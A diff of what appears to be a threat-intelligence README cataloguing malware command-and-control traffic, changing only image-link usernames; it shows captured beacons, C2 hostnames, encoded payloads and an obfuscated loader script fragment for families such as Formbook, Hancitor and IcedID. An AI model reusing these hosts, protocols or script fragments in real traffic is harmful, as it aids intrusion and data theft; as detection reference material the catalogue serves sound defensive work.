 #### Exilerat
 ~~~
@@ -1134,14 +1134,14 @@ GyMjI6JSolKiUqIL2yMjI4qySoqCSqKiSoIpSqKCSikRquqyUqqS4lKqoqJS4qob
 kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
 --71h2ll4i66hhbl--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/exilerat.png "Exilerat")
 
 #### Expiro
 ~~~
 POST dovamnabihede.ws HTTP/1.1
 User-Agent: Mozilla/4.0 (Compatible; msie 44; NT6.1.7601-90376708.ENU.3DA43F52-83C788-FF5FFC-15DD1711; .NET CLR 00000000/00000000)
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/expiro.png "Expiro")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/expiro.png "Expiro")
 
 #### Filecoder.STOP
 ~~~
@@ -1159,7 +1159,7 @@ Content-Type: text/html; charset=UTF-8
 
 {"public_key":"-----BEGIN&#160;PUBLIC&#160;KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5pjgODTtZORmS4jeVWQV\\nvs71Fz\/NH7IWyR7an0L+rLo1S7Jrqn64J8LXlT\/1eiDN87tYle5AlB4\/vmf4Uo98\\ncMG\/E+NbFLtyRyxTq4RmaNDjyvTPIXbBl+cMU4yIwBKT89D8tuD6PhdfVVjMx71l\\niEPtuNb5pD38EYGv\/3+Yrwvg3sU1+aiIWdZgPX3ieFxAL3ZZkvlr5\/XeNpKqGAiT\\n6YBjLZg7R\/5j5Knhex+gKUR2Gkh2CG7mWqjcaNUK9Hzkgk3\/UmqopxokpSTkHmUT\\nSlN5mKAg438TmIUz4MCnnieexOtpcg7Fmn2wPObgdIG3OXK5yfxxExa+TBDTbCFc\\ngQIDAQAB\\n-----END&#160;PUBLIC&#160;KEY-----\\n","id":"Em9SPAhlG3hXHt713xEY92niynachhsXeWwCv6cB"}
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stopfilecoder.png "Expiro")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/stopfilecoder.png "Expiro")
 
 
 #### Fin7 JS Backdoor
@@ -1193,7 +1193,7 @@ Host: moviedvdpower.com
 
 lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%13CUTGUD%0AT%00%04%0F%01%08T%05WUR%05%01%02U%0F%07S%08%03%02%07S%03%07%09%05%0E%00U%05V%13DYZP%0D%01%05%05%00%00%07%13EYS%08%06%02%05%13YT%0A%00%02%0A%02%01%0A%00%07%0F%04q%0Dtt%0A%05%04oeDPB%1Dgv%16@VRUo%5EQ%0D%5ERB%26_%267500
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/fin7jsbackdoor.png "Fin7 JS Backdoor")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/fin7jsbackdoor.png "Fin7 JS Backdoor")
 
 #### Firebird RAT
 ~~~
@@ -1205,14 +1205,14 @@ lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%1
 00000048  29 53 56 2b 43 59 15 34  3d 3d 03 0c 3c 22 0c 04   )SV+CY.4 ==..<"..
 00000058  13 14 0b                                           ...
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/firebird.png "Firebird")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/firebird.png "Firebird")
 
 #### Flawedammyy
 ~~~
 = ..">h..K...t.......N<.
 .Q..1....%S-.8z...id=53292686&os=7 SP1 x86&priv=User+UAC&cred=USER-PC\admin&pcname=USER-PC&avname=&build_time=08-08-2019 14:24:35 PM&card=0&
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/flawedammyy.png "Flawedammyy")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/flawedammyy.png "Flawedammyy")
 
 #### Formbook
 formbook hostnames are almost always www
@@ -1232,7 +1232,7 @@ Accept-Encoding: gzip, deflate
 
 Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D2fNVsLRL8o7GMMvu8SY6wR8pwXAraJm4TKmuw5(TglqswaX2VpD_gJ3yal4FZ1pkDvEP81iuj_l_mMoqsdCGaFMxmu8LQC1CZjkxIXbFtlEaQg0Wfzvxpk9XRS39rZxxdqjALdRL8_N2LHRzPN35WuoIIn2J0mUB7u7x~42TwXHpZcLTJ4cELO23a_seXaFdgz~QWrxi7L3N9oGrwrY4tSxRUCsHQCoAB8CsxlUDIkY67TYTnYPmJxKxE06yA9NA5buPXUU-rDGiNGDQ25(b371m2NNnyheUxDNxyL6wr0syvlQ7Qn~DvzJO1j4_01FUfdeQKDmT9nuRD7AXJYaO3DIZnG1RWkvBxF0H38hB8-R7b1kP1IZqlFNLuC1ttRMUWPoRYyiYb-5rzJXywgOQncCVwVXcwH8dkVBf8nIw1doGRbV0yBZciG1vmCQMiyqspdkDVZt-1KyQhCCDaZWgyx(jUEtrJ5ZzRRfL7eaLGAG1u46ihMFAoJdDXorJcFL051WdJ2wHBfyMv2c9wu1j78lVpEWNkON2Qnw-8VOoQrg4ItHc4WjdsmkjCk(8A-d-uwY70GE0UXkWhPpg~_8qCqj_XNsXD1Cku4u0im9ibvYCLeQyYDn_FmL-U7ZNtOIbYeTHchiTz3fwdILdormZDVBuDzJlRACku5YKuqCIZoTnxUBI(iGkeX0da3GEkWCi8MA6nuA390kyWjwjSpzGHFYPG0B41C5bU5KrJx(9qiFYNfQPZqv5KDyJL8tN7jrqIny7WzTVRqvRHCeerIFPL5vosxC_3QvH2AlElM8Ssx(QZqz22ySsvMzyq8Hv~3tMLtg8mgzByn2dH2WrNAM3nk~XXu(6GurJtah4M9tPmohFGPLZxX5e3WCJ~h16eNNM4OaV~MOGVYusVrPgqFUS6P7iizTBZS(MsulNfuAKYvUq2kUMtCYSZAt34TUY6bJ5BTPy~4ydE8n16XohSRP8VbqhLAZ4DGO2n-hfrK2o9oUsNUWcpZyKA2(9kXBftM3s5lzWT21wBKbcPaiPURUuV4eheOkTBTxTB_mMxCafVVE6yvbJD-XIpSazCu(sS7~QUEbh6EPrqsB11rhKlRPy39G2rLo6lSMHeGjCmI5Rc80lhtZyFKcqhNYbhwuiEn3uK9CodgYxVie6yY1MwI(M8VSBZ-zQjldjXnFN~7oKDW3JglzgbK3lzeDK5aRb0HTwohxi8M9lRkTKflhtcr77iOlBVcE6HYSbchngmsBWBgPwA75xvzJhUUtgjJlxLW~bSPMG7x7GLVfCZjxxrjki0R9ZPDVdx71eP4yoIdymwRgqddVSuGCAIf641vyoItI9QzfvvuZBdpRQi3ZEw7LUifYAyjYZ2Xd9KdOMiNiLLeLsDCgWib~5r8iSfExWtFjsEgOt(2W_0JQSAgplkqJxkO9YxSdB9xsPfeavxYirf7azw7UGnDTEMQUnMMECFM5_v29oh6tKvIolHPv_qZrW0nGwd0aCMfzUqcV0(NlfiEQOxVZTonlWkJoR3hyyZQ~dKGW9j_WbA-8s54GvC-VC~skS2jG4haG9bxKA6QZqRK4-2qI5o2U3rNoeQEz_~yMfZ2fQoftvSkgpJfcgjuh3qTOFK8b6OSe5wMnyLdniF_4xN3rO(73lGUB5l60LbBa4TAYc(Qn7pyfvhlhMx8nr0vm6kCom1xi-VN1M(fSDqNubOVR_8QORONDFaX41G3HYOrWQyQ5Cvd6lAFgWycF3KeaumEH0LEUP7vR3t8CqgQ5VqyDxtKNy0Z7MVbqsq6s8~aYdnUL5DxSG9pbe8LW4uDqLcBuZ2WiDWmdiRx0cbf9-s0qx6mSwAo(Wz67SmWp2X8VI3W4h3M3vf9BggKJQmHp7nLChKFWJWTuEGt43fxqjimz5WaRYtGOcdlH84XYvX9kEB1C4(Fp99P6VKHhrkuCOrtiirAvl7KvjXYhsiOn20cjKKUL6l8(aZofg6g(CqTpB5dDGN86Korg1L6advz28Cc9QidH5ZPIAHrWXi9nG5FtnBxG-3R2N(J6V~IGsC8NZIwv0qB~35YLhS9SlyD38(p(pgy9N3fPHO9Gzlzd6D3j74fN-N89jhcQTClusyQIhdjrYsqWnpi7Of2Hl9zRx(ut-kFP33A5zYLbDn54f9gg8kH1m(BeKfVXxVtpGLR4VQSBfZzVwPGnUei9aJDZkXwmg0xftRV~S3TxUucpU1d75Pa9NCvgMU51f7uv0XtF1S-0_nqUy(apdab1FJcSzLOVDXJDyOKr5P4px5QpKM1FZgH9mgQQZuo~rlcBi4jISUNx3qv7fwaBZ4KDYuICC1-KLeFh0i7YEU_njjPm31uzkYLlVxfbhAg6C7Fxcpr5_jzhW~me85m48ifV4C06qNAN5WgIGxJW07CUNAuLx2d4tZI85EWgoxQa3AOuINyalNllQZt2LBB~ReVqa8Gr3pLpZOSiDREVqDaruTFqNwAZndKWZ~CTIV4ss6txpH7ypXw3AZ4fiDn5j7NDtaJzXbptIpWgrv9yK(zab71BYxnEuPpsdZSnA2QWY9s300CraaT3RPj(gdt~5OjaG22qma1M9LYzgvBdIBH57aizchPopkjnWiJAuvabKSvJyEtKb5Ni67H1WbOnOKM8pMcqsaIBi1AfQV0PbikKmG-HikPS86JBnJXZs8BWrbgm7g8uGrVpnnuHbHuP4p4xAOgYNPDbnpSoXn0kH~vUc1JxLurnAnNWMmYgA5g3fIw7HGvJSnKn6DDHod7HUKWF3ggfFJdZbucZxbJ2fpE64O6nKFy9It-R0BRZqcunVVvWy4zwCQ_1brWO78sSQY3WY4Es8kI6nl5hc9k3dhAWgQJWeqVrUGnOyxnf3wP9Tjc3fbhhfMthKeTVJEn485mDsUhxaOlIUrAoNDk1Kmua8F3zzcHpo~ixmjApivEsgkkIIni~mHnw4sce0IaJmWT9Ka_FCRQTC3dNAkBJHjcfTsYpgDvJBeZI8V7tnXTcJwQShoQoTdzOUvebgdia2s6HyC8Ay3lybE0Kvi4Ufu2qeJDnpSdiZAi8Ba-AzxnhL~66T~sQU0SY1ZDTJsdMD9zA8h5A0g71lMEIFSEdczwnvBeXpuEiaX9FOoJQwoIyyq4KmaeML~f5ipBL5MgqKf36tQ4N9jiM0IMAZdarP~ZkdSRs6dnJ7bU4FFMvQUrM0EGSJMQfLAvB7d_c0IwGUl44oifYX7n8cNJQcRPEFt1PZYPKE47I_JQ2CSVE9Scfi6hmF2mrjjozj0NQFcK5B~W~c3GpQxJ8e9cNoWhrkZNK1CyKcuTjHkfWA5Bzoi5p5mrTFsA12M25Ubt5SuEd-grtNyFbdev6Uyoislno4UJ9J6-8ag6iZXJd_QI17cAFS4P71bi7ApOh50qN4cNMIQBUTQyriS5BG~os6RMAuoaSUq92eNx12764W~RIGssW6ItGJFcg09D9nPLTs9jUhkhVwPicIhcak5ZLrkASapi44847mp8bI7hAIINPrZaKEyXejiDm5OUm7UVGno15_(251Jq3-Aic6sgovlTvlWBTFSkikUCmSMDX96nLlTuNiC2BD42WLJfGoZQw4T341YKl3rFShZ24mtmUGThc4k-k1OxGK1ygo5wLOg_H_Bs9MfxPn3aoIQiBq(XC7l4Xzw2LREItIvFPQXoWU(dxz3g)..
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/formbook.png "Formbook")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/formbook.png "Formbook")
 
 #### GET2Loader (TA505):
 ~~~
@@ -1249,7 +1249,7 @@ Date: Wed, 09 Oct 2019 18:53:18 GMT
 Content-Length: 0
 Connection: keep-alive
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
 
 #### Glupteba
 ~~~
@@ -1262,8 +1262,8 @@ Accept-Encoding: gzip
 
 [{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"DXM_Runtime","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Office Proof (French) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Security Update for Microsoft Office 2010 (KB2289078)","display_version":"","install_date":""},{"display_name":"Microsoft Outlook Social Connector (KB2289116) ..........s","display_version":"","install_date":""},{"display_name":"Definition update for Microsoft Office 2010 (KB982726)","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Publisher 2010 (KB2409055)","display_version":"","install_date":""},{"display_name":"IEData","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2151757","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X64 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared 32-bit MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Microsoft Office Professional 2010","display_version":"14.0.4763.1000","install_date":""},{"display_name":"Microsoft Office Publisher MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Outlook MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2202188)","display_version":"","install_date":""},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2467173","display_version":"","install_date":""},{"display_name":"Google Update Helper","display_version":"1.3.33.23","install_date":"20190319"},{"display_name":"IE40","display_version":"","install_date":""},{"display_name":"IE4Data","display_version":"","install_date":""},{"display_name":"Java 8 Update 92 (64-bit)","display_version":"8.0.920.14","install_date":"20180208"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"VLC media player","display_version":"2.2.6","install_date":""},{"display_name":"WinRAR 5.60 (64-bit)","display_version":"5.60.0","install_date":""},{"display_name":"Microsoft Office Single Image 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Access Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Adobe Flash Player 27 PPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X86 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Mozilla Firefox 67.0.4 (x64 en-US)","display_version":"67.0.4","install_date":""},{"display_name":"SchedulingAgent","display_version":"","install_date":""},{"display_name":"Microsoft Office Excel MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Skype... 7.39","display_version":"7.39.102","install_date":"20180208"},{"display_name":"CCleaner","display_version":"5.35","install_date":""},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":"20190321"},{"display_name":"Microsoft Office Access MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"Adobe Acrobat Reader DC MUI","display_version":"15.007.20033","install_date":"20180208"},{"display_name":"MPlayer2","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161","display_version":"9.0.30729.6161","install_date":"20180208"},{"display_name":"Microsoft Office Proofing (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (Spanish) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Adobe Flash Player 27 ActiveX","display_version":"27.0.0.187","install_date":""},{"display_name":"Adobe Flash Player 27 NPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Google Chrome","display_version":"75.0.3770.100","install_date":"20180208"},{"display_name":"Microsoft Office Word MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft OneNote 2010 (KB2433299)","display_version":"","install_date":""},{"display_name":"Microsoft Office OneNote MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB982573","display_version":"","install_date":""},{"display_name":"Realtek AC'97 Audio","display_version":"","install_date":""},{"display_name":"MobileOptionPack","display_version":"","install_date":""},{"display_name":"Microsoft Office PowerPoint MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Update for Microsoft .NET Framework 4.7.2 (KB4087364)","display_version":"1","install_date":""},{"display_name":"Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030","display_version":"11.0.61030.0","install_date":""},{"display_name":"AddressBook","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Word 2010 (KB2345000)","display_version":"","install_date":""},{"display_name":"Microsoft Office Shared Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":""},{"display_name":"Connection Manager","display_version":"","install_date":""},{"display_name":"Fontcore","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"Mozilla Maintenance Service","display_version":"67.0.4","install_date":""},{"display_name":"Notepad++ (64-bit x64)","display_version":"7.5.1","install_date":""},{"display_name":"WIC","display_version":"","install_date":""},{"display_name":"QEMU guest agent","display_version":"2.10.68","install_date":"20190730"},{"display_name":"Update for Microsoft Outlook Social Connector (KB2289116)","display_version":"","install_date":""},{"display_name":"Microsoft Office Office 32-bit Components 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Java Auto Updater","display_version":"2.8.92.14","install_date":"20180208"},{"display_name":"DirectDrawEx","display_version":"","install_date":""},{"display_name":"IE5BAKEX","display_version":"","install_date":""},{"display_name":"Opera 12.15","display_version":"12.15.1748","install_date":""},{"display_name":"Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219","display_version":"10.0.40219","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2005 Redistributable (x64)","display_version":"8.0.61000","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.30501","display_version":"12.0.30501.0","install_date":""}]
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/glupteba-1.png "Glupteba")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/glupteba-2.png "Glupteba")
 
 #### Godzilla Loader
 ~~~
@@ -1290,7 +1290,7 @@ Content-Encoding: gzip
 
 <div id="s">IKqglmKsWN8CSCWpwIItt6O/sFpxceFdZPucGXeeUi1CbtjgXllqiSnOcsojWNxNP8ySG4XsKU94bKJh2vFSAtqb+g939WslRHMzKsr2YaDwN51PG9a/CZ/BVaK3Idznf3tkNJAy9+6r6vj/9spjxPp1+pqK3DrdVr7uJG0xkSv8Ez7fmCPgc4YrHpSk2cMvODT9bbv1eNE4zjGd+N4t3Lhp/+k48QWtGIQ48A6Q9HzhWO1L4SpVawEVg/hbN+EJSCVhQCIljVpvrcyeY6w1yX9QT5TSZosQlbzog3mLceYYz1teNlHwhGToXVDb9ACyxlo/FrdlapR/R0jCx0F+OQ==</div>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/godzilla.png "Godzilla Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/godzilla.png "Godzilla Loader")
 
 #### GrandSteal
 ~~~
@@ -1315,7 +1315,7 @@ Sec-WebSocket-Accept: 3pYl7XQW+GMu4ydBWBEUXbuIKJo=
 
 .~..."ª..Ê.......... .(.8.@...ugmajJAPYc
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/grandsteal.png "GrandSteal")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/grandsteal.png "GrandSteal")
 
 #### Hancitor
 ~~~
@@ -1337,7 +1337,7 @@ X-Powered-By: PHP/5.4.45
 
 FFUUARZAEg4OCkBVVQ0NDVQVFB8eEx0TGBUCVBkVF1UNClcZFRQOHxQOVQoWDx0TFAlVCRcbCA5XCRYTHh8IV0lVExQZFg8eHwlVSwYSDg4KQFVVDQ0NVA4SGVcbFBQfAlQZFRdVDQpXGRUUDh8UDlVLBhIODgpAVVUXGw4fCBMbFlcUHwgPHlQID1UNClcTFBkWDx4fCVUKFRcVVUsGEg4OCkBVVRkWHwwfCB8eDxkbDhMVFFQZFRdUGw9VDQpXExQZFg8eHwlVDRMeHR8OCVVLBhIODgpAVVUfGRsIHwoSVBUIHVUNClcZFRQOHxQOVQoWDx0TFAlVGBgKFQ0fCAobGRFVExQZFg8eHwlVSwcBGEASDg4KQFVVDQ0NVBUUHx4THRMYFQJUGRUXVQ0KVxkVFA4fFA5VChYPHRMUCVUJFxsIDlcJFhMeHwhXSVUTFBkWDx4fCVVIBhIODgpAVVUNDQ1UDhIZVxsUFB8CVBkVF1UNClcZFRQOHxQOVUgGEg4OCkBVVRcbDh8IExsWVxQfCA8eVAgPVQ0KVxMUGRYPHh8JVQoVFxVVSAYSDg4KQFVVGRYfDB8IHx4PGRsOExUUVBkVF1QbD1UNClcTFBkWDx4fCVUNEx4dHw4JVUgGEg4OCkBVVR8ZGwgfChJUFQgdVQ0KVxkVFA4fFA5VChYPHRMUCVUYGAoVDR8IChsZEVUTFBkWDx4fCVVIBwEIQBIODgpAVVUNDQ1UFRQfHhMdExgVAlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVQkXGwgOVwkWEx4fCFdJVRMUGRYPHh8JVUkGEg4OCkBVVQ0NDVQOEhlXGxQUHwJUGRUXVQ0KVxkVFA4fFA5VSQYSDg4KQFVVFxsOHwgTGxZXFB8IDx5UCA9VDQpXExQZFg8eHwlVChUXFVVJBhIODgpAVVUZFh8MHwgfHg8ZGw4TFRRUGRUXVBsPVQ0KVxMUGRYPHh8JVQ0THh0fDglVSQYSDg4KQFVVHxkbCB8KElQVCB1VDQpXGRUUDh8UDlUKFg8dExQJVRgYChUNHwgKGxkRVRMUGRYPHh8JVUkH
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hancitor.png "Hancitor")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/hancitor.png "Hancitor")
 
 #### Hawkeye keyogger
 ~~~
@@ -1355,7 +1355,7 @@ PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
 b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
 ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/hawkeye.png "Hawkeye")
 
 #### Icedid
 ~~~
@@ -1379,7 +1379,7 @@ Accept-Ranges: bytes
 IHDR..............N.T....sRGB.........gAMA......a....	pHYs..........o.d.	;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E
 .~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid-2.png "Icedid")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/icedid-2.png "Icedid")
 
 URI for websocket is usually data2.php
 ~~~
@@ -1395,7 +1395,7 @@ Connection: upgrade
 Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
 Upgrade: websocket
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid.png "Icedid websocket")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/icedid.png "Icedid websocket")
 
 New Loader
 ~~~
@@ -1454,7 +1454,7 @@ Connection: keep-alive
 ...
 IHDR...............#&....sRGB.........gAMA......a....	pHYs..."...".........IDATx^....lKz..e....>...0.f.s.... f...`...J..."$...!Qv.a9...p..............6....|...+..#.2M.2
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedidloader.png "IcedID Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/icedidloader.png "IcedID Loader")
 
 #### iDex Stealer
 ~~~
@@ -1606,16 +1606,16 @@ Idle
 
 -----------------------------8d7d7ccad7ce23c--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex1.png "iDex")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex2.png "iDex")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex3.png "iDex")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/idex1.png "iDex")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/idex2.png "iDex")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/idex3.png "iDex")
 
 #### Imminent RAT
 ~~~
 00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/imminent-1.png "Imminent")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/imminent-2.png "Imminent")
 
 #### ISRStealer
 ~~~
@@ -1636,7 +1636,7 @@ Content-Length: 0
 Date: Tue, 08 Oct 2019 14:06:15 GMT
 Server: LiteSpeed
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/isrstealer.png "ISRStealer")
 
 #### JasperLoader
 ~~~
@@ -1691,7 +1691,7 @@ ibcvwj.push("");
 ibcvwj.push("885tSDCB4aw");
 ibcvwj.push("wR6EREzW>CzEz54zRy361wRDt97y");
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jasperloader.png "JasperLoader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/jasperloader.png "JasperLoader")
 
 #### JsOutProx
 ~~~
@@ -1717,7 +1717,7 @@ Hex decoded cookie example from above:
 ~~~
 C4BA3647_|_89a9c0f8-9556-4c9f-bccd-c074ddc14b09_|_USER-PC_|_admin_|_Microsoft Windows 7 Professional _|_6.1.7601_|_JsOutProx_|_ping
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jsoutprox.png "JsOutProx")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/jsoutprox.png "JsOutProx")
 
 #### JSSLoader
 ~~~
@@ -1732,7 +1732,7 @@ AAAAAA==
 AQAAAA==
 VGhlIGlucHV0IGlzIG5vdCBhIHZhbGlkIEJhc2UtNjQgc3RyaW5nIGFzIGl0IGNvbnRhaW5zIGEgbm9uLWJhc2UgNjQgY2hhcmFjdGVyLCBtb3JlIHRoYW4gdHdvIHBhZGRpbmcgY2hhcmFjdGVycywgb3IgYW4gaWxsZWdhbCBjaGFyYWN0ZXIgYW1vbmcgdGhlIHBhZGRpbmcgY2hhcmFjdGVycy4g
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jssloader.png "JSSLoader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/jssloader.png "JSSLoader")
 
 #### Keybase
 ~~~
@@ -1752,7 +1752,7 @@ Cache-Control: no-cache
 
